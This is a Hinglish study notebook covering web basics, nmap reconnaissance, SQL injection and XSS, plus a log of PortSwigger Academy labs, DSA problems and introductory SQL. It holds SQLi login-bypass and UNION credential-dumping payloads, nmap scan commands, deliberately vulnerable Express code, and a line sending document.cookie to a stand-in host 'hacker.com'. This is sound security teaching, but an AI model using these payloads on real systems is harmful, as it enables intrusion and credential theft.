# 🎯 Lesson 1: How the Web Works (Client-Server, DNS & HTTP)

Bhai, yeh tumhara official Lesson 1 hai. Internet, hacking, aur web development ka poora foundation isi topic par tika hai.

---

## 🌐 1. The Big Picture (Scenario: Typing a URL)
Jab tum browser me `www.securetrade.com` type karte ho, toh parde ke peeche ye 4 steps hote hain:
1. **Client (Browser)** check karta hai ki domain ka IP address kya hai.
2. **DNS (Domain Name System)** domain name ko IP address (`13.233.14.85`) me convert karta hai.
3. **Client** us IP address par ek **HTTP Request** bhejta hai (Port 80/443 par).
4. **Server (VPS)** request process karta hai aur return me **HTTP Response** (HTML/CSS/JS/JSON) bhejta hai.

---

## 🛠️ 2. Core Concepts Breakdown

### A. DNS (Domain Name System)
* **What is it?** Internet ki Phonebook.
* **Why do we need it?** Hum humans names yaad rakh sakte hain (`google.com`), par computers sirf numbers (IP addresses like `142.250.190.46`) samajhte hain. DNS in dono ko map karta hai.

### B. Client-Server Model
* **Client:** Jo data maangta hai (Browser, Mobile App).
* **Server (VPS):** Jo data store aur process karta hai aur return benga (24/7 online cloud computer).

### C. HTTP vs HTTPS (Security of Data in Transit)
* **Sniffing:** Network me ja rahe data packets ko beech me intercept karke (chupke se) padhna.
* **HTTP (Port 80):** Data **Plaintext** me travel karta hai. Hacker passwords aur cookies sniff kar sakta hai.
* **HTTPS (Port 443):** HTTP + **SSL/TLS Encryption**. Data encrypted hota hai. Hacker sniff karne par bhi padh nahi sakta.

---

## 🛡️ Lesson 2: IP Addresses, Ports & Firewalls (Reconnaissance)

Bhai, hacking karne se pehle target ki jankari nikalna (Reconnaissance) sabse important step hota hai. Iske bina hacking andhere me teer chalane jaisa hai.

### 1. IP Address (Public vs Private)
* **Public IP:** Aapke server ka global address jo pure internet par unique hota hai. (Jaise aapke ghar ka mailing address).
  * *Example:* `13.233.14.85` (VPS IP)
* **Private IP (Local IP):** Aapke local network (Wi-Fi) ke andar diya gaya temporary address. Yeh internet par accessible nahi hota.
  * *Example:* `192.168.1.15` (Aapka laptop)

---

### 2. Ports (Server ke Darwaze)
Ek VPS/Server par hazaaron services ek sath chal sakti hain. Har service ko client se connect karne ke liye ek alag **Port** (Gate number) diya jata hai. Total **65,535** ports hote hain.

**Hacker's Top Standard Ports to Scan:**
* **Port 22 (SSH):** Command line access ke liye (Remote administration).
* **Port 80 (HTTP):** Unsecure web pages.
* **Port 443 (HTTPS):** Secure web pages.
* **Port 3306 (MySQL):** Database server.
* **Port 5432 (PostgreSQL):** PostgreSQL database server (Supabase uses this).

---

### 3. Firewall (The Security Guard)
Firewall ek software/hardware security system hai jo incoming aur outgoing network traffic ko filter karta hai.
* **Rules:** Firewall me rules set hote hain, jaise: *"Port 80 aur 443 se aane wale traffic ko aane do, par Port 22 aur 3306 ko block kar do (sirf owner ka IP hi bypass kar sake)."*
* **Bypass:** Agar developer firewall configure karna bhool jaye, toh hacker direct database port (3306) par attack kar sakta hai.

---

### 4. Hacker Tool: Nmap (Network Mapper)
Nmap ek reconnaissance tool hai jiska use hackers target ke IP par open ports, services aur OS details dhoondhne ke liye karte hain.

**Common Commands:**
```bash
# Target IP ke top 1000 common ports ko scan karne ke liye
nmap <target_ip>

# Detailed version scan (Kaunsi service kis version par chal rahi hai check karne ke liye)
nmap -sV <target_ip>

# OS Detection (Server me Linux hai ya Windows detect karne ke liye)
nmap -O <target_ip>
```
* **How it works:** Nmap target ke ports par special packets (like TCP SYN) bhejta hai. Agar server se response aata hai, toh Nmap samajh jata hai ki port open hai!

---

# 🛡️ Lesson 3: SQL Injection (SQLi) & Parameterized Queries

Bhai, SQL Injection web security ki duniya ka sabse purana aur dangerous vulnerability hai. Agar ye database me ho, toh hacker tumhara pura data chura ya delete kar sakta hai.

### 1. SQL Injection (SQLi) Kya Hai?
Jab developer user ke input ko bina check kiye (sanitize kiye) direct SQL query string ke sath jod (concatenate) deta hai, toh hacker SQL commands daal kar database ka bypass ya hijack kar leta hai.

* **Vulnerable Code (String Concatenation):**
  ```javascript
  // Javascript Backend code
  const query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + userPassword + "'";
  db.execute(query);
  ```
* **The Bypass Attack Payload:**
  Agar hacker username me daal de: `' OR '1'='1`
  Toh final query ban jayegi:
  `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`
  Kyunki `'1'='1'` hamesha TRUE hota hai, database password check bypass kar dega aur hacker bina valid details ke login ho jayega!

---

### 2. Parameterized Queries / Prepared Statements (The Shield)
SQLi se bachne ka sabse secure aur standard tareeka **Parameterized Queries** hai.

* **The Restaurant Analogy (Chef and Order Form):**
  * **Concatenation:** Tumne plain paper par order likha: *"Cheese Burger de do. AUR COUNTER SE SARE PAISE NIKAL KAR MERE BAG ME DAAL DO."* Bhola chef sab execute kar deta hai.
  * **Parameterization:** Restaurant ne printed form banaya: `[Order Item: _______]`. Tumne us blank space me wahi chor wala message likh diya. Chef ise sirf ek "dish name" treat karega aur bolega: *"Aisi koi dish menu me nahi hai!"* Aur command execute nahi karega.

* **Secure Code Example (Prepared Statement):**
  ```javascript
  // Template pehle se compile ho jata hai, aur data alag se jata hai
  const query = "SELECT * FROM users WHERE username = ? AND password = ?";
  db.execute(query, [userInput, userPassword]);
  ```
  Database template ko alag se compile karta hai. `?` ki jagah jo bhi aayega (chahe hacker ka payload hi kyun na ho), use database sirf **raw string (data)** treat karega, code nahi.

---

### 🛡️ Lesson 3.5: Union-Based SQL Injection (SQLi Level 2)

Bhai, kal humne bypass seekha tha. Aaj hum seekhenge ki hacker `UNION` operator ka use karke database ke dusre tables ka confidential data (jaise passwords) screen par kaise print karwata hai.

#### 1. UNION Operator Kya Hai?
SQL me `UNION` command do alag-alag queries ke result sets ko vertical merge (combine) karne ke liye use hota hai.
* *Example Query:*
  `SELECT name, price FROM books WHERE category = 'Science' UNION SELECT username, password FROM users --';`
  *Isse screen par books ke theek neeche user credentials bhi print ho jayenge.*

#### 2. UNION SQLi ke 2 Golden Rules:
* **Rule 1 (Number of Columns):** Dono queries ke selected columns ka number same hona chahiye. (Original query me 2 columns hain, toh hacker ke select me bhi exact 2 columns hone chahiye).
* **Rule 2 (Data Type Compatibility):** Corresponding columns ka data type compatible hona chahiye. (Pehla column text hai, toh hacker ka pehla select column bhi text hona chahiye).

#### 3. Columns & Data Types Dhoondhne ki Hacking Tricks:
* **ORDER BY Technique (Columns ginn-na):**
  Hacker input me daalta hai: `' ORDER BY 1 --`, `' ORDER BY 2 --`...
  Jis number par error aaye, usse theek pehle wala number total column count hai. (e.g. 3 par error aaya, toh 2 columns hain).
* **NULL Technique (Types check karna):**
  Hacker bhejta hai: `' UNION SELECT NULL, NULL --` (Sahi chalega).
  Fir ek-ek karke NULL ki jagah `'a'` character rakh kar test karta hai:
  `' UNION SELECT 'a', NULL --` (Agar error nahi aaya, toh column 1 text accept karta hai).

#### 4. The 4-Step Dumping Process:
* **Step 1:** Database name/version nikalna:
  `' UNION SELECT NULL, database() --`
* **Step 2:** Table names nikalna:
  `' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' --` (Mili table: `users`).
* **Step 3:** Columns ke naam nikalna:
  `' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users' --` (Mile columns: `email`, `password`).
* **Step 4 (Final Dump):**
  `' UNION SELECT email, password FROM users --`

---

# 📊 Lesson 4: DSA Stack & Greedy Mastery

Bhai, humne hal hi me teen classic DSA questions solve kiye hain. Unki quick notes aur dry run logic ye rahi:

### 1. Next Greater Element II (Circular Array) - Monotonic Stack
* **Problem:** Har element ke right side me usse bada element dhoondhna hai. Circular array hone ki wajah se aakhiri element ghum kar aage se check karega.
* **Logic (Virtual Doubling):** Hum array ko double create karne ki jagah loop ko `2 * N - 1` se `0` tak chalate hain aur index ke liye `% N` (modulo) use karte hain.
* **Core Steps in Loop:**
  1. **POP:** Jab tak stack empty nahi hai aur stack ka top chota ya equal hai current element se, tab tak pop karo (kyunki bada element use block kar dega).
  2. **STORE:** Agar hum loop me actual bounds me hain (`i < N`), toh check karo: agar stack khali nahi hai, toh `res[i] = stack.peek()`. Else, `res[i] = -1`.
  3. **PUSH:** Current element ko stack me push karo.

---

### 2. Asteroid Collision (LeetCode 735) - Stack Simulation
* **Problem:** Asteroids (+ ya -) directions me chal rahe hain. Aamne-saamne aane par takraate hain. Chota blast ho jata hai, equal size ke dono blast ho jate hain.
* **Logic:** Collision tabhi hoga jab stack top par positive (`> 0`) aur current element negative (`< 0`) ho.
* **Core Loop:**
  * While stack top positive hai aur current size se chota hai, pop karte jao.
  * Agar top current ke equal hai, pop karo aur dono ko blast kar do.
  * Agar stack empty ho jaye ya top par negative aa jaye, toh current negative element bach gaya, use stack me push kar do.

---

### 3. Maximum Ice Cream Bars (LeetCode 1833) - Greedy (Sorting)
* **Problem:** Fixed coins se sabse zyada ice creams kharidni hain.
* **Logic (Greedy vs DP):** 
  * DP se solve karne par Memory Limit Exceed (MLE) aayega kyunki coins ki range $10^8$ hai.
  * Greedy works best: Sabse zyada ice cream kharidne ke liye hamesha **sabse sasti** ice creams pehle kharido.
* **Steps:**
  1. `costs` array ko sort karo (`Arrays.sort()`).
  2. Loop chalao, agar coins cost se zyada hain, toh count `+1` karo aur coins minus karo (`coins -= costs[i]`).
  3. Agar afford nahi kar sakte, toh loop break kar do (kyunki aage wali aur mehangi hongi).

---

# 📝 DSA Solved Questions Tracker (Session Progress)

Humne pichle 2-3 dino me aur aaj ke session me niche likhe DSA questions successfully solve/discuss kiye hain:

1. **Next Greater Element I (LeetCode 496)** - Stack/HashMap [Monotonic Stack]
2. **Next Greater Element II (LeetCode 503)** - Circular Array [Monotonic Stack]
3. **Daily Temperatures (LeetCode 739)** - Array Distance [Monotonic Stack]
4. **Valid Parentheses (LeetCode 20)** - Expected Closures [Stack]
5. **Maximum Ice Cream Bars (LeetCode 1833)** - Sorting/Affordability [Greedy]
6. **Trapping Rain Water (LeetCode 42)** - Prefix/Suffix Max Boundaries [Two Pointers]
7. **Largest Rectangle in Histogram (LeetCode 84)** - Next/Prev Smaller boundaries [Monotonic Stack]
8. **Sliding Window Maximum (LeetCode 239)** - Monotonic Deque [Sliding Window]
9. **Single Element in a Sorted Array (LeetCode 540)** - Parity check [Binary Search]
10. **Super Ugly Number (LeetCode 313)** - Multi-Pointer DP [Dynamic Programming]

*(Naye questions jaise hi hum solve karenge, is list me add hote jayenge!)*

---

# 🛡️ Lesson 5: Cross-Site Scripting (XSS) - Level 1

### 1. XSS Kya Hota Hai?
* **Definition:** Hacker website ke user input areas (comments, search, etc.) me plaintext ki jagah malicious **JavaScript script** (jaise `<script>alert('hack')</script>`) inject kar deta hai. Browser is script ko blindly trust karke execute (run) kar deta hai.
* **SQLi vs XSS:** SQLi database ko target karta hai, XSS website ke **users (browsers/clients)** ko target karta hai.

---

### 2. Stored XSS (Persistent XSS)
Hacker ka script database me save ho jata hai, aur har visitor automatically hack ho jata hai.

#### Vulnerable Code Example (Express & Database):
```javascript
// Comment submit karne ka API
app.post('/api/comment', async (req, res) => {
    const userComment = req.body.text; // 1. Read user input
    // 2. Direct string concatenation se database query execute
    await db.query("INSERT INTO comments (text) VALUES ('" + userComment + "')"); 
    res.send("Comment Posted!");
});
```
* **Line-by-line Explanation:**
  * `app.post(...)`: Client se comment save karne ke liye POST endpoint banaya.
  * `const userComment = req.body.text`: Browser se user ke type kiye comment text ko request body se read kiya.
  * `await db.query(...)`: Comment string ko direct concatenating se database me insert kiya (Vulnerable part!).

---

### 3. Reflected XSS (Non-Persistent XSS)
Script database me save nahi hoti, direct URL se page par reflect (print) ho kar run hoti hai. Hacker victim ko customized link send karta hai: `site.com/search?q=<script>...</script>`.

#### Vulnerable Code Example:
```javascript
// Search API
app.get('/search', (req, res) => {
    const query = req.query.q; // 1. Read query parameter
    // 2. Query ko response me directly print kar dena
    res.send("<h1>Search Results for: " + query + "</h1>"); 
});
```
* **Line-by-line Explanation:**
  * `app.get(...)`: Search query load karne ke liye GET route setup kiya.
  * `const query = req.query.q`: URL key parameter `q` se dynamic query value read ki.
  * `res.send(...)`: Bheje gaye query data ko HTML headers ke sath concatenate karke direct client ko response return kar diya (Vulnerable part!).

---

### 4. DOM-Based XSS (Client-Side Bug)
Server isme involve nahi hota. HTML page ke browser-side JavaScript code me hi bug hota hai, jo URL se unsafe data lekar screen par execute kar deta hai.

#### Vulnerable Code Example (HTML/JS):
```html
<script>
    const name = window.location.hash; // 1. URL se hash read kiya
    document.write("Hello " + name);   // 2. Direct web page par print kiya
</script>
```
* **Line-by-line Simplified Explanation:**
  * `<script> ... </script>`: Browser ko batata hai ki iske andar JavaScript (actions) likhi hai, plain text nahi.
  * `const name = window.location.hash;`: Browser ko address bar dekhne ko bolta hai aur `#` ke baad likha text (jaise `#harry`) `name` variable me save kar leta hai.
  * `document.write("Hello " + name);`: `"Hello "` aur user ke naam ko jodd kar direct web page par active HTML code ki tarah print kar deta hai (Vulnerable part!).

---

### 5. XSS ka Impact (Hacker kya kar sakta hai?):
* **Session Hijacking:** JavaScript `document.cookie` se session token/JWT chura kar hacker ke server par send kar sakta hai: `fetch('http://hacker.com/steal?c=' + document.cookie)`.
* **Phishing/Defacement:** Website ka design dynamic modify karke fake login forms chipka dena.
* **Keylogging:** User ke inputs ko trace karna.

---

# 🧪 Practical Hacking Labs Log (PortSwigger Academy)

Bhai, yahan hum apne live hacking labs ka record aur steps note karte chalenge taaki tum bhulo nahi!

### 1. Lab 1: SQL Injection in WHERE Clause (Retrieving Hidden Data)
* **Goal:** Category filter ko bypass karke database ke saare hidden/unreleased products ko screen par print karwana.
* **Attack Steps:**
  1. Target website par category **`Gifts`** par click kiya.
  2. URL address bar me check kiya: `.../filter?category=Gifts`.
  3. URL parameters ke end me payload lagaya: `Gifts' OR 1=1 --`
     *(Final URL: `.../filter?category=Gifts' OR 1=1 --`)*
  4. Enter press kiya.
* **Why it worked:** Database query ke end ka `AND released = 1` filter `--` (comment) ki wajah se ignore ho gaya, aur `OR 1=1` (always true) hone se saare hidden items print ho gaye!

### 2. Lab 2: SQL Injection allowing Login Bypass
* **Goal:** Username box me SQL Injection perform karke bina password ke `administrator` account me login karna.
* **Attack Steps:**
  1. Website ke **`My account`** page (Login page) par gaye.
  2. **`Username`** box me payload dala: `administrator' --`
  3. **`Password`** box me koi bhi random text dala (jaise `123`).
  4. **`Log in`** button par click kiya.
* **Why it worked:** Database check query:
  `SELECT * FROM users WHERE username = 'administrator' --' AND password = '123';`
  Username ke aage laga `--` (comment) password check ko bypass/comment-out kar deta hai, jisse database query sirf username check karke admin login access de deti hai!

### 3. Lab 3: UNION SQL Injection (Oracle Database Version Extraction)
* **Goal:** Oracle database ka software version retrieve karke screen par print karwana.
* **Concepts Learnt:**
  * **Oracle `dual` Table:** Dummy table jiska use Oracle database me queries ke strict syntax rule (`FROM` block compulsory) ko satisfy karne ke liye kiya jata hai.
  * **Comma Position rule:** `SELECT value1, value2` me comma ke left wala Column 1 me jata hai, right wala Column 2 me jata hai.
  * **Strict Type Checking (Oracle):** Oracle database aam databases ki tarah numbers ko automatically text me convert nahi karta. Agar target column Text type hai, toh hum wahan direct number `1, 2` select nahi kar sakte (crash ho jayega).
* **Hacking Steps:**
  1. **Column Count check:** Check kiya ki kis number par page crash hota hai:
     * `Gifts' ORDER BY 1 --` (Success)
     * `Gifts' ORDER BY 2 --` (Success)
     * `Gifts' ORDER BY 3 --` (Internal Server Error)
     * *Conclusion:* Total **2 columns** exist karte hain.
  2. **DataType check:** `dual` table se data types test kiya:
     * `Gifts' UNION SELECT 1, 2 FROM dual--` (Failed with 500 error because Oracle text columns don't accept numerical directly).
     * `Gifts' UNION SELECT 'a', 'b' FROM dual--` (Success! Dono columns text accept karte hain).
  3. **Version Extraction:** Oracle ka system view `v$version` aur column `banner` use kiya. Dono columns fill kiye:
     * `Gifts' UNION SELECT banner, 'a' FROM v$version--`
  4. **Result:** Screen par Oracle database version dump ho gaya aur lab solve ho gayi!

### 4. Lab 4: UNION SQL Injection (MySQL Version Extraction)
* **Goal:** MySQL database ka software version retrieve karke screen par print karwana.
* **Concepts Learnt:**
  * **MySQL Comment Rule:** MySQL me `--` ke baad space compulsory hota hai, jo URL me strip ho jata hai. Isiliye hum `#` (URL encoded as `%23`) use karte hain comment ke liye.
  * **No Dummy Table:** MySQL me standalone variables ke liye `FROM` clause ya dummy table (`dual`) ki jarurat nahi hoti.
  * **Version Variable:** MySQL me version variable `@@version` hota hai.
* **Hacking Steps:**
  1. **Column Count check:** Check kiya ki kis number par page crash hota hai:
     * `Gifts' ORDER BY 1%23` (Success)
     * `Gifts' ORDER BY 2%23` (Success)
     * `Gifts' ORDER BY 3%23` (Internal Server Error) ➔ Total **2 columns** hain.
  2. **DataType check:** `Gifts' UNION SELECT 'a', 'b'%23` (Success ➔ Dono columns Text type hain).
  3. **Version Extraction:** `Gifts' UNION SELECT @@version, 'a'%23` (Success ➔ Version screen par print ho gaya!).

### 5. Lab 5: UNION SQL Injection (Listing Database Contents on non-Oracle DB)
* **Goal:** Database schemas aur tables ko bypass/query karke custom users table (`users_xxxxxx`) aur uske random columns se usernames aur passwords chura kar admin login karna.
* **Concepts Learnt:**
  * **String Concatenation (`||`):** PostgreSQL/Oracle me two strings ko dynamically merge karne ke liye use hota hai (jaise JS me `+` hota hai).
  * **Why we concatenated:** Kyunki humne check kiya ki Column 2 Text type nahi hai (number type hai). Isiliye hum `username, password` ko alag columns me nahi select kar sakte the. Humne dono ko `:` divider ke sath chipka kar single column string banakar Column 1 (Text support) me select kiya!
* **Hacking Steps:**
  1. **Column Count & Datatype Check:** 
     * `Pets' ORDER BY 3--` (Crash ➔ Total **2 columns** exist).
     * `Pets' UNION SELECT NULL, 'a'--` (Crash ➔ Column 2 is NOT text type).
     * `Pets' UNION SELECT 'a', NULL--` (Success ➔ Column 1 IS text type).
  2. **Table Enumeration:** Database ke tables list karne ke liye filter lagaya:
     * `Pets' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_name LIKE '%user%'--`
     * *Found Table Name:* `users_kxdpho`
  3. **Column Enumeration:** Target table ke columns retrieve karne ki query chalayi:
     * `Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_kxdpho'--`
     * *Found Columns:* `username_ppvrnm` aur `password_penxus`
  4. **Credentials Extraction (Concatenation):**
     * `Pets' UNION SELECT username_ppvrnm || ':' || password_penxus, NULL FROM users_kxdpho--`
  5. **Result:** Screen par `administrator:<password>` print ho gaya. Admin password lekar account login bypass kar liya!




---

# 🗄️ Lesson 6: DBMS — Keys, Data Types & Basic Queries

---

## 🔑 PART 1: KEYS

### KEY kya hota hai?
Kisi bhi row ko uniquely pehchanne wali cheez = KEY!
*(Jaise Roll No se exact ek student pehchan sakte hain!)*

### 5 Types of Keys:

| Key | Definition | Example |
|-----|-----------|---------|
| **Super Key** | Koi bhi unique combination | {Roll_No}, {Email}, {Roll_No, Name} |
| **Candidate Key** | Minimum Super Key (extra columns nahi) | {Roll_No}, {Email}, {Phone} |
| **Primary Key** | Chosen Candidate Key — NULL nahi, Duplicate nahi, SIRF EK | Roll_No = PRIMARY KEY |
| **Foreign Key** | Doosre table ki PK refer karta hai — value exist karni chahiye! | Orders.Customer_ID → Customers.Customer_ID |
| **Composite Key** | 2+ columns milke Primary Key bante hain | (Roll_No + Course_ID) together |

### Foreign Key — Simple Rule:
- 2 tables hoti hain: **Parent** aur **Child**
- Child table ka column → Parent table ki PK ko point karta hai
- Child me wahi value daalo jo Parent me already exist karti ho!
- Parent delete nahi kar sakte jab tak Child me uski values hain!

---

## 📦 PART 2: SQL DATA TYPES

| Type | Use karo jab | Example |
|------|-------------|---------|
| `VARCHAR(n)` | Text — variable length | Name, Email, City |
| `CHAR(n)` | Fixed length text | PIN code |
| `TEXT` | Bahut lamba text | Comments, Description |
| `INT` | Pura number | Age, Marks, Roll No |
| `BIGINT` | Bahut bada number | Phone Number |
| `DECIMAL(8,2)` | Decimal number | Price (999.99), Salary |
| `DATE` | Date only | DOB (2003-05-15) |
| `TIMESTAMP` | Date + Time | Created_At |
| `BOOLEAN` | True/False only | Is_Active |

---

## 💻 PART 3: SQL QUERIES — BASIC

### Practice Table Setup (db-fiddle.com ya Oracle Live SQL pe run karo):

```sql
CREATE TABLE students(
    roll_no INT PRIMARY KEY,
    name    VARCHAR(50),
    city    VARCHAR(50),
    marks   INT
);

INSERT INTO students VALUES (101, 'Akshat',  'Surat', 85);
INSERT INTO students VALUES (102, 'Rahul',   'Delhi', 92);
INSERT INTO students VALUES (103, 'Priya',   'Surat', 78);
INSERT INTO students VALUES (104, 'Amit',    'Delhi', 95);
INSERT INTO students VALUES (105, 'Sneha',   'Pune',  88);
```

---

### Query 1 — SELECT (Saara data dikhao):
```sql
SELECT * FROM students;
-- * = Saare columns
```

### Query 2 — Specific Columns:
```sql
SELECT name, city FROM students;
```

### Query 3 — WHERE (Filter karo):
```sql
SELECT * FROM students WHERE city = 'Surat';
SELECT * FROM students WHERE marks > 90;
```

### Query 4 — AND / OR:
```sql
-- Dono condition true honi chahiye
SELECT * FROM students WHERE city = 'Surat' AND marks > 80;

-- Koi bhi ek condition true ho
SELECT * FROM students WHERE city = 'Delhi' OR city = 'Pune';
```

### Query 5 — ORDER BY (Sort karo):
```sql
SELECT * FROM students ORDER BY marks ASC;   -- Kam se zyada
SELECT * FROM students ORDER BY marks DESC;  -- Zyada se kam
```

### Query 6 — LIMIT (Sirf kuch rows):
```sql
-- Top 3 students (highest marks)
SELECT * FROM students ORDER BY marks DESC LIMIT 3;
```

### Query 7 — INSERT (Data daalo):
```sql
INSERT INTO students VALUES (106, 'Rohan', 'Mumbai', 91);
```

### Query 8 — UPDATE (Data update karo):
```sql
UPDATE students SET marks = 90 WHERE roll_no = 101;
```

### Query 9 — DELETE (Data hatao):
```sql
DELETE FROM students WHERE roll_no = 101;
```

---

### ⚠️ Common Mistakes Yaad Rakh:
```
❌ PRIMRY KEY     → ✅ PRIMARY KEY
❌ Akshat         → ✅ 'Akshat'  (String = single quotes!)
❌ SELECT FROM    → ✅ SELECT * FROM
❌ "Akshat"       → ✅ 'Akshat'  (Double quotes nahi, single quotes!)
❌ Column ke baad comma nahi → ✅ Comma lagao!
```

---

### Where to Practice:
- **PostgreSQL:** [db-fiddle.com](https://db-fiddle.com) → PostgreSQL select karo
- **Oracle:** [livesql.oracle.com](https://livesql.oracle.com) → Free account banao



